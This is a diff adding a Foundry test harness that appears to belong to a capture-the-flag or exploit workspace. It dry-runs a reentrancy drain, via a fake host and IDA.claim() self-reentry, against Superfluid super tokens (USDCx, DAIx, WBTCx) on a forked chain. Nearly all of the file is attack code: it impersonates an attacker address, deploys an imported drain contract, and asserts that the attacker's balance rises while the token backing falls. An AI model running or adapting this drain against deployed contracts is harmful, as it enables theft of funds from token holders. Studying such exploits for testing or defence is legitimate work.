@@ -1,0 +1,68 @@
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.23;
+
+import "forge-std/Test.sol";
+import {Ch5ERC20Drain} from "../exploit/Run.s.sol";
+
+interface IERC20View {
+    function balanceOf(address account) external view returns (uint256);
+}
+
+interface ISuperTokenView {
+    function getUnderlyingToken() external view returns (address);
+}
+
+/// @notice Dry-run harness for the ERC20-backed continuation of the proven
+///         fake-host `IDA.claim()` self-reentry drain.
+contract Attempt40ERC20DrainTest is Test {
+    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
+
+    address internal constant USDCX = 0xCAa7349CEA390F89641fe306D93591f87595dc1F;
+    address internal constant DAIX = 0x1305F6B6Df9Dc47159D12Eb7aC2804d4A33173c2;
+    address internal constant WBTCX = 0x4086eBf75233e8492F1BCDa41C7f2A8288c2fB92;
+    address internal constant ROUTER = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;
+
+    uint256 internal constant MAX_REENTRY_COUNT = 10;
+    uint256 internal constant MAX_ROUNDS = 8;
+
+    function setUp() public {
+        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
+    }
+
+    function test_execute_drain_for_remaining_tokens() public {
+        uint256 nativeBefore = ATTACKER.balance;
+
+        vm.startPrank(ATTACKER);
+        _drainToken("USDCx", USDCX, 520_000_000, 100 ether);
+        _drainToken("DAIx", DAIX, 530_000_000, 100 ether);
+        _drainToken("WBTCx", WBTCX, 540_000_000, 1 ether);
+        vm.stopPrank();
+
+        uint256 nativeAfter = ATTACKER.balance;
+        console.log("attacker native before:", nativeBefore);
+        console.log("attacker native after:", nativeAfter);
+        console.log("attacker native delta:", nativeAfter - nativeBefore);
+
+        assertGt(nativeAfter, nativeBefore, "native balance should strictly increase");
+    }
+
+    function _drainToken(string memory label, address superToken, uint32 indexBase, uint256 bootstrapNative) internal {
+        address underlying = ISuperTokenView(superToken).getUnderlyingToken();
+        uint256 backingBefore = IERC20View(underlying).balanceOf(superToken);
+        console.log(label);
+        console.log("backing before:", backingBefore);
+
+        Ch5ERC20Drain drain = new Ch5ERC20Drain(superToken, ROUTER, indexBase, address(0));
+        (uint256 roundsExecuted, uint256 nativeOut) = drain.executeDrain{value: bootstrapNative}(
+            MAX_ROUNDS, MAX_REENTRY_COUNT
+        );
+
+        uint256 backingAfter = IERC20View(underlying).balanceOf(superToken);
+        console.log("rounds:", roundsExecuted);
+        console.log("native out:", nativeOut);
+        console.log("backing after:", backingAfter);
+
+        assertGt(roundsExecuted, 0, "no rounds executed");
+        assertLt(backingAfter, backingBefore, "backing did not decrease");
+    }
+}
